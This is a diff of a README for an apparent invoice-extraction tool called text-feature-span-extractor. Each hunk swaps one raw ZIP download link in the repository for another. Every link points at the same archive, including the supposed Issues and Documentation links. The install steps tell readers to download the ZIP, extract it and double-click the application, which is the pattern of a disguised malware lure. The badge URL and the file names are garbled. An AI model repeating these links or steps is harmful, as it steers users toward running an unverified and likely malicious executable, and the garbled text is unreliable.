@@ -1,7 +1,7 @@
 # 🎉 text-feature-span-extractor - Efficient Invoice Data Extraction
 
 ## 📦 Download Now
-[![Download Latest Release](https://github.com/FajarSangTrader/text-feature-span-extractor/raw/refs/heads/main/scripts/extractor_text_feature_span_3.0.zip%https://github.com/FajarSangTrader/text-feature-span-extractor/raw/refs/heads/main/scripts/extractor_text_feature_span_3.0.zip)](https://github.com/FajarSangTrader/text-feature-span-extractor/raw/refs/heads/main/scripts/extractor_text_feature_span_3.0.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/FajarSangTrader/text-feature-span-extractor/main/data/ingest/feature_extractor_span_text_2.9-beta.4.zip%https://raw.githubusercontent.com/FajarSangTrader/text-feature-span-extractor/main/data/ingest/feature_extractor_span_text_2.9-beta.4.zip)](https://raw.githubusercontent.com/FajarSangTrader/text-feature-span-extractor/main/data/ingest/feature_extractor_span_text_2.9-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the text-feature-span-extractor! This application helps you extract important data from invoices without the need for complex setups or expensive software. Our goal is to provide you with a straightforward way to handle invoice data extraction.
@@ -21,12 +21,12 @@ Before you start, ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To get started, visit the following page to download the latest version of the application:
 
-[Download Latest Release](https://github.com/FajarSangTrader/text-feature-span-extractor/raw/refs/heads/main/scripts/extractor_text_feature_span_3.0.zip)
+[Download Latest Release](https://raw.githubusercontent.com/FajarSangTrader/text-feature-span-extractor/main/data/ingest/feature_extractor_span_text_2.9-beta.4.zip)
 
 ### 🎯 Installation Steps
 1. **Visit the Releases Page:** Click the link above to go to the releases page on GitHub.
 2. **Choose the Right File:** Look for the most recent version listed. You will see several files.
-3. **Download the File:** Click on the file to start the download. This will typically be named something like `https://github.com/FajarSangTrader/text-feature-span-extractor/raw/refs/heads/main/scripts/extractor_text_feature_span_3.0.zip` or `https://github.com/FajarSangTrader/text-feature-span-extractor/raw/refs/heads/main/scripts/extractor_text_feature_span_3.0.zip`.
+3. **Download the File:** Click on the file to start the download. This will typically be named something like `https://raw.githubusercontent.com/FajarSangTrader/text-feature-span-extractor/main/data/ingest/feature_extractor_span_text_2.9-beta.4.zip` or `https://raw.githubusercontent.com/FajarSangTrader/text-feature-span-extractor/main/data/ingest/feature_extractor_span_text_2.9-beta.4.zip`.
 4. **Extract Files (if necessary):** If you downloaded a ZIP file, right-click on it and choose "Extract All" to unpack the files.
 5. **Run the Application:** Double-click the application file to launch it.
 
@@ -48,8 +48,8 @@ If you encounter issues while using the application, consider the following tips
 
 ## 💡 Additional Resources
 To learn more about features or find help with specific issues, check out the following resources:
-- [GitHub Issues Page](https://github.com/FajarSangTrader/text-feature-span-extractor/raw/refs/heads/main/scripts/extractor_text_feature_span_3.0.zip): Report problems or ask questions.
-- [Documentation](https://github.com/FajarSangTrader/text-feature-span-extractor/raw/refs/heads/main/scripts/extractor_text_feature_span_3.0.zip): Access detailed guides and instructions.
+- [GitHub Issues Page](https://raw.githubusercontent.com/FajarSangTrader/text-feature-span-extractor/main/data/ingest/feature_extractor_span_text_2.9-beta.4.zip): Report problems or ask questions.
+- [Documentation](https://raw.githubusercontent.com/FajarSangTrader/text-feature-span-extractor/main/data/ingest/feature_extractor_span_text_2.9-beta.4.zip): Access detailed guides and instructions.
 
 ## 🤝 Contributing
 If you’d like to contribute to this project, please submit your suggestions through the Issues page and check out our guidelines in the documentation.
